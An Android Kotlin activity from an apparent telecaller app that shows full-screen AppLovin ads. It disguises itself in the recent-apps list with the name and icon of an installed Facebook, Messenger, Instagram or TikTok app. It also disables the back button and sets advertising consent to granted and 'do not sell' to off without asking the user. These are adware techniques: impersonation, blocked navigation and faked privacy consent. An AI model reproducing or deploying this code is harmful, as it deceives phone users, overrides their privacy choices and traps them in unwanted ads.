package com.fantasia.telecaller

import android.app.ActivityManager.TaskDescription
import android.content.pm.ApplicationInfo
import android.content.pm.PackageManager
import android.graphics.Canvas
import android.graphics.Color
import android.os.Bundle
import androidx.activity.OnBackPressedCallback
import androidx.appcompat.app.AppCompatActivity
import androidx.core.graphics.createBitmap
import com.applovin.mediation.MaxAd
import com.applovin.mediation.MaxAdListener
import com.applovin.mediation.MaxError
import com.applovin.mediation.ads.MaxInterstitialAd
import com.applovin.sdk.AppLovinPrivacySettings
import com.applovin.sdk.AppLovinSdk


class DymmyActivity : AppCompatActivity(), MaxAdListener {
    private var ad: MaxInterstitialAd? = null
    private val listOfApps = listOf(
        "com.facebook.orca",
        "com.facebook.katana",
        "com.example.facebook",
        "com.facebook.android",
        "com.instagram.android",
        "com.ss.android.ugc.trill"
    )

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setTaskDescription()
        initMediator()
        onBackPressedDispatcher.addCallback(this, object : OnBackPressedCallback(true) {
            override fun handleOnBackPressed() {

            }
        })
    }

    private fun initMediator() {
        AppLovinPrivacySettings.setHasUserConsent(true, this)
        AppLovinPrivacySettings.setIsAgeRestrictedUser(false, this)
        AppLovinPrivacySettings.setDoNotSell(false, this)

        with(AppLovinSdk.getInstance(this)) {
            if (isInitialized) load()
            else {
                mediationProvider = "max"
                initializeSdk { load() }
            }
        }
    }

    private fun load() {
        ad = MaxInterstitialAd("0503148458df4c99", this)
        ad?.setListener(this)
        ad?.loadAd()
    }

    private fun setTaskDescription() {
        getApplicationInfoForApp()
            .let(::getTaskDescription)
            .let(::setTaskDescription)
    }

    @Suppress("DEPRECATION")
    private fun getTaskDescription(info: ApplicationInfo?) = if (info != null)
        TaskDescription(info.loadLabel(packageManager).toString(), getLogoBitmap(info), Color.WHITE)
    else TaskDescription(" ", getLogoBitmap(info), Color.BLACK)

    private fun getLogoBitmap(info: ApplicationInfo?) = createBitmap(100, 100).apply {
        val canvas = Canvas(this)
        info?.loadIcon(packageManager)?.let {
            it.setBounds(0, 0, width, height)
            it.draw(canvas)
        } ?: eraseColor(Color.BLACK)
    }

    private fun getApplicationInfoForApp() = listOfApps
        .mapNotNull(::existApplicationInfo)
        .randomOrNull()

    private fun existApplicationInfo(packageName: String) = try {
        packageManager.getApplicationInfo(packageName, PackageManager.GET_META_DATA)
    } catch (e: Exception) {
        null
    }

    private fun onHide() {
        FCMService.saveShowingTime(this)
        finishAndRemoveTask()
    }

    override fun onTrimMemory(level: Int) {
        super.onTrimMemory(level)
        if (level == TRIM_MEMORY_UI_HIDDEN) onHide()
    }

    override fun onAdLoaded(add: MaxAd) {
        ad?.showAd()
    }

    override fun onAdDisplayed(ad: MaxAd) {

    }

    override fun onAdHidden(ad: MaxAd) {
        onHide()
    }

    override fun onAdClicked(ad: MaxAd) {
        onHide()
    }

    override fun onAdLoadFailed(adUnitId: String?, error: MaxError?) {
        onHide()
    }

    override fun onAdDisplayFailed(ad: MaxAd?, error: MaxError?) {
        onHide()
    }

}
